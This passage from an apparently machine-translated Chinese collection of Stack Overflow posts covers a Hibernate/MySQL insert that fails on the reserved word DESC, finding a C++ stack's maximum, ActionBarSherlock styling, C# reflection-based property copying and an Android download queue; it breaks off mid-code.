                org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:80)
                org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:923)
                org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:852)
                org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:882)
                org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:778)
                javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
                javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:330)
                org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:118)
                org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:84)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:113)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:103)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:113)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:54)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:45)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.authentication.www.BasicAuthenticationFilter.doFilter(BasicAuthenticationFilter.java:150)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:183)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:105)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:87)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:192)
                org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:160)
                org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:346)
                org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:259)
            root cause

            org.hibernate.exception.SQLGrammarException: could not insert: [com.slclassifieds.adsonline.model.Advertisement]
                org.hibernate.exception.SQLStateConverter.convert(SQLStateConverter.java:92)
                org.hibernate.exception.JDBCExceptionHelper.convert(JDBCExceptionHelper.java:66)
                org.hibernate.id.insert.AbstractReturningDelegate.performInsert(AbstractReturningDelegate.java:63)
                org.hibernate.persister.entity.AbstractEntityPersister.insert(AbstractEntityPersister.java:2346)
                org.hibernate.persister.entity.AbstractEntityPersister.insert(AbstractEntityPersister.java:2853)
                org.hibernate.action.EntityIdentityInsertAction.execute(EntityIdentityInsertAction.java:71)
                org.hibernate.engine.ActionQueue.execute(ActionQueue.java:273)
                org.hibernate.event.def.AbstractSaveEventListener.performSaveOrReplicate(AbstractSaveEventListener.java:320)
                org.hibernate.event.def.AbstractSaveEventListener.performSave(AbstractSaveEventListener.java:203)
                org.hibernate.event.def.AbstractSaveEventListener.saveWithGeneratedId(AbstractSaveEventListener.java:129)
                org.hibernate.event.def.DefaultSaveOrUpdateEventListener.saveWithGeneratedOrRequestedId(DefaultSaveOrUpdateEventListener.java:210)
                org.hibernate.event.def.DefaultSaveOrUpdateEventListener.entityIsTransient(DefaultSaveOrUpdateEventListener.java:195)
                org.hibernate.event.def.DefaultSaveOrUpdateEventListener.performSaveOrUpdate(DefaultSaveOrUpdateEventListener.java:117)
                org.hibernate.event.def.DefaultSaveOrUpdateEventListener.onSaveOrUpdate(DefaultSaveOrUpdateEventListener.java:93)
                org.hibernate.impl.SessionImpl.fireSaveOrUpdate(SessionImpl.java:685)
                org.hibernate.impl.SessionImpl.saveOrUpdate(SessionImpl.java:677)
                org.hibernate.impl.SessionImpl.saveOrUpdate(SessionImpl.java:673)
                org.springframework.orm.hibernate3.HibernateTemplate$16.doInHibernate(HibernateTemplate.java:740)
                org.springframework.orm.hibernate3.HibernateTemplate.doExecute(HibernateTemplate.java:406)
                org.springframework.orm.hibernate3.HibernateTemplate.executeWithNativeSession(HibernateTemplate.java:374)
                org.springframework.orm.hibernate3.HibernateTemplate.saveOrUpdate(HibernateTemplate.java:737)
                com.slclassifieds.adsonline.dao.AdvertisementDaoImpl.save(AdvertisementDaoImpl.java:32)
                sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
                sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
                sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
                java.lang.reflect.Method.invoke(Method.java:601)
                org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:319)
                org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:183)
                org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:150)
                org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:110)
                org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)
                org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:202)
                $Proxy27.save(Unknown Source)
                com.slclassifieds.adsonline.web.AdController.viewAdDetails(AdController.java:66)
                sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
                sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
                sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
                java.lang.reflect.Method.invoke(Method.java:601)
                org.springframework.web.method.support.InvocableHandlerMethod.invoke(InvocableHandlerMethod.java:213)
                org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:126)
                org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:96)
                org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:617)
                org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:578)
                org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:80)
                org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:923)
                org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:852)
                org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:882)
                org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:778)
                javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
                javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:330)
                org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:118)
                org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:84)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:113)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:103)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:113)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:54)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:45)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.authentication.www.BasicAuthenticationFilter.doFilter(BasicAuthenticationFilter.java:150)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:183)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:105)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:87)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:192)
                org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:160)
                org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:346)
                org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:259)
            root cause

            com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DESC, IMG1, IMG3, IMG2, PRICE, TITLE, USER_ID) values ('3', '2013-01-01 19:09:30' at line 1 
```

我尝试删除 ManytoOne 关联（删除 USER_ID 和 CAT_ID FK），但我无法保存到这两个表中。但是我可以通过调用得到一个广告类的对象`advertisementDao.getAdById(id)`，它还会自动加载相关的类别对象和用户对象。我还将所有四个类都添加到了休眠配置文件中。

我看不出是什么导致了这个错误。最后，我尝试通过从会话中获取 Query 对象以传统方式创建 SQL 插入查询。它也给出了同样的错误。请帮我。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T14:19:55.640

`DESC`是 MySQL 中的保留字，因此不能将其用作列名。您应该重命名您的列以使插入工作。

# c++ - 通过使用另一个堆栈找到堆栈中的最大值？

> ID：14111024
> 
> 赞同：-1
> 
> 时间：2013-01-01T13:50:51.940
> 
> 标签：c++, stack, max

我有以下代码用于查找堆栈中的最大值。它正在工作，但我应该使用另一种方法来查找最大值，因为在调用 getMax() 函数后，我无法显示堆栈 a。

```
int Sorter:: getMax(){
    c.push(a.top());
    a.pop();
    while(!a.empty()){
            if(a.top() > c.top()){
            c.pop();
                    c.push(a.top());
                    a.pop();
            }
            else
                    a.pop();
    }
    return c.top();
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T14:07:10.650

`O(1)`查找堆栈最大值的时间和内存方法如下：

1.  对于堆栈中的每个元素，让我们将最大值存储在该元素**下方。**
2.  推送元素时，其存储的（最大值）值为`max(st.top().value, st.top().maxValue)`
3.  弹出元素时，不需要更改任何内容。

这样就可以获得栈内所有元素在`O(1)`时间和内存复杂度上的最大值。

伪代码：

```
class StackWithMax
{
struct node
{
    int value; // an actual value;
    int maxValue; // maximum of below elements
};

stack<node> st;

public:
void pop()
{
    st.pop();
}

void push(const int &val)
{
   node newNode;
   newNode.value = val;
   newNode.maxValue = (st.empty() == true ? -INFINITY : max(st.top().maxValue, st.top().value) );
   st.push(newNode);
}

int maxStackValue() const
{
    assert(st.empty() == false);
    return st.top().maxValue;
}

}; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-01T14:10:17.390

将最大值保存在边变量中：

```
int max = a.top();
while(!a.empty()){
  c.push(a.top());
  a.pop()
  if(c.top() > max){
    max = c.top(); // find the maximum among the values of a.
  }
}

// This loop can be replaced with a.swap(c). As jogojapan mentioned.
// It is to demonstrate the principal.
while(!c.empty())
{
  a.push(c.top());  // return the values back into a
  c.pop();
}

return max; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-01T14:01:34.870

由于您已经有了工作代码，因此您需要分析以下内容。

1.  您现有解决方案的时间复杂度和空间复杂度是多少？
2.  您可能已经知道，时间和空间之间存在权衡，您可以使用**更多空间**来实现更好的时间复杂度吗？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-01T14:11:43.343

我要做的是查看整个堆栈并保存答案，然后使用 secodn 堆栈重建原始堆栈。

```
int Sorter:: getMax(){
    if(a.empty)
    {
        //handle this however you see fit
    }

    int res = a.top;
    //search for the maximum
    while(!a.empty()){
        if(a.top() > res){
            res = a.top();
        }
        c.push(a.top());
        a.pop();
    }

    //restore the original stack
    while(!c.empty()){
        a.push(c.top());
        c.pop();
    }
    return res;
} 
```

顺便说一句，“a”和“c”是错误的变量名。我让它们与您的代码保持一致。您可能应该使用更具描述性的内容。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-01T14:17:24.640

我认为如果允许临时变量，那么它变得非常容易。
算法：

将堆栈 A 的顶部元素放入临时变量 temp=StackA.top();
2\. 从堆栈 A 中弹出一个元素并检查它是否大于临时变量的值。
2.1 如果是，则将值复制到 temp 并将其推送到堆栈 B。
2.2 否则只需将值推送到堆栈 B。
3\. 重复步骤 2 直到堆栈 A 为空

我知道这看起来是一个明显的（而且没什么特别的）解决方案。但是它保留了堆栈的元素，当然如果您希望它们以相同的顺序排列，那么您可以再添加一个步骤来复制堆栈 B 中的所有弹出所有元素并将其推回堆栈 A。

# android - 带有菜单背景颜色的 ActionBarSherlock

> ID：14111027
> 
> 赞同：1
> 
> 时间：2013-01-01T13:51:12.157
> 
> 标签：android, styles, actionbarsherlock

我想在退出的位置设置菜单的 bg 颜色，设置为白色，我正在使用 ActionBarSherlock 样式并尝试获得非常简单的方法。我的风格是这样的：

```
<style name="CustomTheme"  parent="Theme.Sherlock.Light">
    <item name="android:windowTitleSize">50dip</item>
</style> 
```

我需要添加什么元素来做到这一点？

谢谢 ！

# c# - 如何在 C# 中使用反射将对象转换为其他类型的对象？

> ID：14111028
> 
> 赞同：1
> 
> 时间：2013-01-01T13:51:18.023
> 
> 标签：c#, asp.net, asp.net-mvc, c#-4.0, c#-3.0

我有两个包含集合类型属性的类。我创建了一个第一类对象，然后将其转换为另一个类对象。我无法将其转换为另一种类型的对象。

我的第一堂课：-

```
 public partial class Product
{
    public Product()
    {
        this.Product_Category_Mapping = new HashSet<Product_Category_Mapping>();
        this.Product_Manufacturer_Mapping = new HashSet<Product_Manufacturer_Mapping>();
        this.Product_Picture_Mapping = new HashSet<Product_Picture_Mapping>();
        this.ProductReviews = new HashSet<ProductReview>();
        this.Product_SpecificationAttribute_Mapping = new HashSet<Product_SpecificationAttribute_Mapping>();
        this.ProductVariants = new HashSet<ProductVariant>();
        this.ProductTags = new HashSet<ProductTag>();
    }

    public int Id { get; set; }
    public string Name { get; set; }
    public string ShortDescription { get; set; }
    public string FullDescription { get; set; }
    public string AdminComment { get; set; }
    public int ProductTemplateId { get; set; }
    public bool ShowOnHomePage { get; set; }
    public string MetaKeywords { get; set; }
    public string MetaDescription { get; set; }
    public string MetaTitle { get; set; }
    public bool AllowCustomerReviews { get; set; }
    public Nullable<decimal> ApprovedRatingSum { get; set; }
    public Nullable<decimal> NotApprovedRatingSum { get; set; }
    public int ApprovedTotalReviews { get; set; }
    public int NotApprovedTotalReviews { get; set; }
    public bool Published { get; set; }
    public bool Deleted { get; set; }
    public System.DateTime CreatedOnUtc { get; set; }
    public System.DateTime UpdatedOnUtc { get; set; }
    public string FactSheet { get; set; }
    public string VisitorTestimonials { get; set; }
    public string areasofinterest { get; set; }
    public string inventory { get; set; }
    public string GeneralInfo { get; set; }
    public string HowToReach { get; set; }
    public string ShortComment { get; set; }
    public Nullable<int> CountryId { get; set; }
    public Nullable<int> StateProvinceId { get; set; }
    public string City { get; set; }
    public string LandMark { get; set; }
    public Nullable<int> CityId { get; set; }
    public Nullable<int> LandMarkId { get; set; }
    public int MealType { get; set; }
    public Nullable<bool> IsVerified { get; set; }
    public Nullable<bool> IsPrivate { get; set; }
    public Nullable<bool> IsEnabled { get; set; }
    public Nullable<bool> IsMoneyBack { get; set; }
    public string ItineraryOption1 { get; set; }
    public string ItineraryOption2 { get; set; }
    public string ItineraryOption3 { get; set; }
    public string ItineraryOption4 { get; set; }
    public string ItineraryOption5 { get; set; }
    public string ItineraryOption6 { get; set; }
    public string ItineraryOption7 { get; set; }
    public string ItineraryOption8 { get; set; }
    public string ItineraryOption9 { get; set; }
    public string ItineraryOption10 { get; set; }
    public Nullable<int> VendorId { get; set; }
    public string PromotionalMessage { get; set; }
    public Nullable<int> PurchaseRewardPoint { get; set; }
    public Nullable<int> MaximumConsumeRewardPoint { get; set; }
    public Nullable<int> MinimumRewardPoint { get; set; }
    public Nullable<bool> IsTrip { get; set; }
    public Nullable<int> TripType { get; set; }
    public Nullable<int> MinimumBookingforTrip { get; set; }
    public Nullable<bool> IsGuranted { get; set; }

    public virtual ICollection<Product_Category_Mapping> Product_Category_Mapping { get; set; }
    public virtual ICollection<Product_Manufacturer_Mapping> Product_Manufacturer_Mapping { get; set; }
    public virtual ICollection<Product_Picture_Mapping> Product_Picture_Mapping { get; set; }
    public virtual ICollection<ProductReview> ProductReviews { get; set; }
    public virtual ICollection<Product_SpecificationAttribute_Mapping> Product_SpecificationAttribute_Mapping { get; set; }
    public virtual ICollection<ProductVariant> ProductVariants { get; set; }
    public virtual ICollection<ProductTag> ProductTags { get; set; }
} 
```

另一类：-

```
 namespace Nop.Core.Domain.Catalog
{
/// <summary>
/// Represents a product
/// </summary>
public partial class Product : BaseEntity, ILocalizedEntity, ISlugSupported
{
    private ICollection<ProductVariant> _productVariants;
    private ICollection<ProductCategory> _productCategories;
    private ICollection<ProductManufacturer> _productManufacturers;
    private ICollection<ProductPicture> _productPictures;
    private ICollection<ProductReview> _productReviews;
    private ICollection<ProductSpecificationAttribute> _productSpecificationAttributes;
    private ICollection<ProductTag> _productTags;

    /// <summary>
    /// Gets or sets the name
    /// </summary>
    public virtual string Name { get; set; }

    /// <summary>
    /// Gets or sets the short description
    /// </summary>
    public virtual string ShortDescription { get; set; }

    /// <summary>
    /// Gets or sets the ShortComment
    /// </summary>
    public string ShortComment { get; set; }

    /// <summary>
    /// Gets or sets the FactSheet
    /// </summary>
    public string FactSheet { get; set; }

    /// <summary>
    /// Gets or sets the HowToReach
    /// </summary>
    public string HowToReach { get; set; }

    /// <summary>
    /// Gets or sets the GeneralInfo
    /// </summary>
    public string GeneralInfo { get; set; }

    /// <summary>
    /// Gets or sets the Itenary ItineraryOption1 
    /// </summary>
    public string ItineraryOption1 { get; set; }

    /// <summary>
    /// Gets or sets the Itenary ItineraryOption2 
    /// </summary>
    public string ItineraryOption2 { get; set; }

    /// <summary>
    /// Gets or sets the Itenary ItineraryOption3
    /// </summary>
    public string ItineraryOption3 { get; set; }

    /// <summary>
    /// Gets or sets the Itenary ItineraryOption4
    /// </summary>
    public string ItineraryOption4 { get; set; }

    /// <summary>
    /// Gets or sets the Itenary ItineraryOption5
    /// </summary>
    public string ItineraryOption5 { get; set; }

    /// <summary>
    /// Gets or sets the Itenary ItineraryOption6
    /// </summary>
    public string ItineraryOption6 { get; set; }

    /// <summary>
    /// Gets or sets the Itenary ItineraryOption7
    /// </summary>
    public string ItineraryOption7 { get; set; }

    /// <summary>
    /// Gets or sets the Itenary ItineraryOption8
    /// </summary>
    public string ItineraryOption8 { get; set; }

    /// <summary>
    /// Gets or sets the Itenary ItineraryOption9
    /// </summary>
    public string ItineraryOption9 { get; set; }

    /// <summary>
    /// Gets or sets the Itenary ItineraryOption10
    /// </summary>
    public string ItineraryOption10 { get; set; }

    /// <summary>
    /// Gets or sets the Itenary ItineraryOption10
    /// </summary>
    public int MealType { get; set; }

    /// <summary>
    /// Gets or sets the Itenary TripType
    /// </summary>
    public int TripType { get; set; }

    /// <summary>
    /// Gets or sets the IsTrip
    /// </summary>
    public bool IsTrip { get; set; }

     /// <summary>
    /// Gets or sets the IsGuranted
    /// </summary>
    public bool IsGuranted { get; set; }

        /// <summary>
    /// Gets or sets the  MinimumBookingforTrip
    /// </summary>
    public int MinimumBookingforTrip { get; set; }

    /// <summary>
    /// Gets or sets the Itenary IsVerified
    /// </summary>
    public bool IsVerified { get; set; }

    public bool IsPrivate { get; set; }

    public bool IsEnabled { get; set; }
    public int VendorId { get; set; }

    /// <summary>
    /// Gets or sets the Itenary IsMoneyBack
    /// </summary>
    public bool  IsMoneyBack { get; set; }

    /// <summary>
    /// Gets or sets the inventory
    /// </summary>
    public string inventory { get; set; }
    /// <summary>
    /// Gets or sets the areasofinterest
    /// </summary>
    public string areasofinterest { get; set; }
    /// <summary>
    /// Gets or sets the VisitorTestimonials
    /// </summary>
    public string VisitorTestimonials { get; set; }

  /// <summary>
    /// Gets or sets the CountryId
    /// </summary>
    public int? CountryId { get; set; }

    /// <summary>
    /// Gets or sets the StateProvinceId
    /// </summary>
    public int? StateProvinceId { get; set; }

    /// <summary>
    /// Gets or sets the City
    /// </summary>
    public int? CityId { get; set; }

    /// <summary>
    /// Gets or sets the LandMark
    /// </summary>
    public int? LandMarkId { get; set; }

    /// <summary>
    /// Gets or sets the full description
    /// </summary>
    public virtual string FullDescription { get; set; }

    /// <summary>
    /// Gets or sets the admin comment
    /// </summary>
    public virtual string AdminComment { get; set; }

    /// <summary>
    /// Gets or sets a value of used product template identifier
    /// </summary>
    public virtual int ProductTemplateId { get; set; }

    /// <summary>
    /// Gets or sets a value indicating whether to show the product on home page
    /// </summary>
    public virtual bool ShowOnHomePage { get; set; }

    /// <summary>
    /// Gets or sets the meta keywords
    /// </summary>
    public virtual string MetaKeywords { get; set; }

    /// <summary>
    /// Gets or sets the meta description
    /// </summary>
    public virtual string MetaDescription { get; set; }

    /// <summary>
    /// Gets or sets the meta title
    /// </summary>
    public virtual string MetaTitle { get; set; }

    /// <summary>
    /// Gets or sets a value indicating whether the product allows customer reviews
    /// </summary>
    public virtual bool AllowCustomerReviews { get; set; }

    /// <summary>
    /// Gets or sets the rating sum (approved reviews)
    /// </summary>
    public virtual decimal ApprovedRatingSum { get; set; }

    /// <summary>
    /// Gets or sets the rating sum (not approved reviews)
    /// </summary>
    public virtual decimal NotApprovedRatingSum { get; set; }

    /// <summary>
    /// Gets or sets the total rating votes (approved reviews)
    /// </summary>
    public virtual int ApprovedTotalReviews { get; set; }

    /// <summary>
    /// Gets or sets the total rating votes (not approved reviews)
    /// </summary>
    public virtual int NotApprovedTotalReviews { get; set; }

    /// <summary>
    /// Gets or sets a value indicating whether the entity is published
    /// </summary>
    public virtual bool Published { get; set; }

    /// <summary>
    /// Gets or sets a value indicating whether the entity has been deleted
    /// </summary>
    public virtual bool Deleted { get; set; }

    /// <summary>
    /// Gets or sets the date and time of product creation
    /// </summary>
    public virtual DateTime CreatedOnUtc { get; set; }

    /// <summary>
    /// Gets or sets the date and time of product update
    /// </summary>
    public virtual DateTime UpdatedOnUtc { get; set; }

    /// <summary>
    /// Promotional message defined by the vendor
    /// </summary>
    public string PromotionalMessage { get; set; }

    /// <summary>
    /// Reward point to be given on every purchase
    /// </summary>
    public int PurchaseRewardPoint { get; set; }

    /// <summary>
    /// maximum reward point that can be consume on this camp
    /// </summary>
    public int MaximumConsumeRewardPoint { get; set; }

    /// <summary>
    /// Minimum reward point needed to purchase a camp
    /// </summary>
    public int MinimumRewardPoint { get; set; }

    /// <summary>
    /// Distance of the camp from source location
    /// </summary>
    public decimal Distance { get; set; }

    /// <summary>
    /// Complete address of a perticular camps
    /// </summary>
    public string CompleteAddress { get; set; }

    /// <summary>
    /// Distance from the source location of the camp
    /// </summary>
    public string DistanceFromSource { get; set; }

    /// <summary>
    /// Gets or sets the product variants
    /// </summary>
    public virtual ICollection<ProductVariant> ProductVariants
    {
        get { return _productVariants ?? (_productVariants = new List<ProductVariant>()); }
        protected set { _productVariants = value; }
    }
    /// <summary>
    /// Gets or sets the collection of ProductCategory
    /// </summary>
    public virtual ICollection<ProductCategory> ProductCategories
    {
        get { return _productCategories ?? (_productCategories = new List<ProductCategory>()); }
        protected set { _productCategories = value; }
    }

    /// <summary>
    /// Gets or sets the collection of ProductManufacturer
    /// </summary>
    public virtual ICollection<ProductManufacturer> ProductManufacturers
    {
        get { return _productManufacturers ?? (_productManufacturers = new List<ProductManufacturer>()); }
        protected set { _productManufacturers = value; }
    }

    /// <summary>
    /// Gets or sets the collection of ProductPicture
    /// </summary>
    public virtual ICollection<ProductPicture> ProductPictures
    {
        get { return _productPictures ?? (_productPictures = new List<ProductPicture>()); }
        protected set { _productPictures = value; }
    }

    /// <summary>
    /// Gets or sets the collection of product reviews
    /// </summary>
    public virtual ICollection<ProductReview> ProductReviews
    {
        get { return _productReviews ?? (_productReviews = new List<ProductReview>()); }
        protected set { _productReviews = value; }
    }

    /// <summary>
    /// Gets or sets the product specification attribute
    /// </summary>
    public virtual ICollection<ProductSpecificationAttribute> ProductSpecificationAttributes
    {
        get { return _productSpecificationAttributes ?? (_productSpecificationAttributes = new List<ProductSpecificationAttribute>()); }
        protected set { _productSpecificationAttributes = value; }
    }

    /// <summary>
    /// Gets or sets the product specification attribute
    /// </summary>
    public virtual ICollection<ProductTag> ProductTags
    {
        get { return _productTags ?? (_productTags = new List<ProductTag>()); }
        protected set { _productTags = value; }
    }

    public List<StateProvince> States { get; set; }
} 
```

}

我的方法是：-

```
 public static void CopyProperties(dynamic product, dynamic tempProduct)
    {
        PropertyInfo[] productPI = product.GetType().GetProperties();
        PropertyInfo[] tempProductPI = tempProduct.GetType().GetProperties();

        foreach (PropertyInfo temp_prodPI in tempProductPI)
            foreach (PropertyInfo prodPI in productPI)
                if (prodPI.Name == temp_prodPI.Name && temp_prodPI.CanWrite )
                    temp_prodPI.SetValue(tempProduct, prodPI.GetValue(product, null), null);
    } 
```

如何转换这些类型的对象？

# android - 在android中管理下载队列

> ID：14111030
> 
> 赞同：0
> 
> 时间：2013-01-01T13:51:31.150
> 
> 标签：android, download, queue, message-queue

如何排队下载大图？我用过`Service`。队列也是动态的。如果用户开始下载 3 张图片，我将启动下载 3 张图片的服务。但用户也可以添加更多图像以供下载，但我必须添加队列并一一下载所有图像。

我可以使用处理程序`Service`吗？我可以使用`handler.sendMessage(msg1)`和`handler.sendMessage(msg2)`吗？我不知道处理程序中的方法`handleMessage(msg)`巧妙地维护队列。

和是`msg1`同时`msg2`处理还是在队列中处理？如果一一处理就解决了我的问题（意思`msg2`是完成后处理`msg1`）。

或者是否有任何可用的队列管理流程？

这是我想为下载图像和我想存储的下载图像ID创建队列，但如果有任何队列维护某些任务，那么它将会是一个很棒的智能队列。

[在 Android 中排队下载文件](https://stackoverflow.com/questions/8323955/download-files-in-queue-in-android)并没有让我满意。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-02T05:35:17.807

处理程序本身管理消息队列

这可以在`Service`.

我做了示例..我将在队列中使用自定义流程...这里可供下载..

```
public class MainActivity extends Activity {

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    Message msg = h.obtainMessage();
    msg.what = 0;
    msg.obj = "url1";
    h.sendMessage(msg);

    Message msg1 = h.obtainMessage();
    msg1.what = 1;
    msg1.obj = "url2";
    h.sendMessage(msg1);

    Message msg2 = h.obtainMessage();
    msg2.what = 2;
    msg2.obj = "url2";
    h.sendMessage(msg2);

    Message msg3 = h.obtainMessage();
    msg3.what = 3;
    msg3.obj = "url3";
    h.sendMessage(msg3);
}

Handler h = new Handler() {

    @Override
    public void handleMessage(Message msg) {
        Log.e("", "handleMessage(msg) " + msg.what);
        download("" + System.currentTimeMillis(), "" + msg.obj);
        super.handleMessage(msg);
    }
};

private void download(String name, String link) {

    try {

        // Debug.e("", photo.imagename);
        URL url = new URL(link);
        HttpGet httpRequest = new HttpGet(url.toURI());

        HttpClient httpclient = new DefaultHttpClient();
        HttpResponse response = (HttpResponse) httpclient
                .execute(httpRequest);

        HttpEntity entity = response.getEntity();
        BufferedHttpEntity bufHttpEntity = new BufferedHttpEntity(entity);
        InputStream input = bufHttpEntity.getContent();

        File outPutFile = new File(
                Environment.getExternalStorageDirectory(), name);
        OutputStream output = new FileOutputStream(outPutFile);

        try {
            byte[] buffer = new byte[1024];
            int bytesRead = 0;
            while ((bytesRead = input.read(buffer, 0, buffer.length)) >= 0) {
                output.write(buffer, 0, bytesRead);
            }

        } finally {
            output.close();
            input.close();
        }

        // Toast.makeText(mContext, "Download completed",
        // Toast.LENGTH_SHORT).show();

        // incrementCounter(Constant.ACTION_DOWNLOADS, photo.iid);

    } catch (Exception e) {
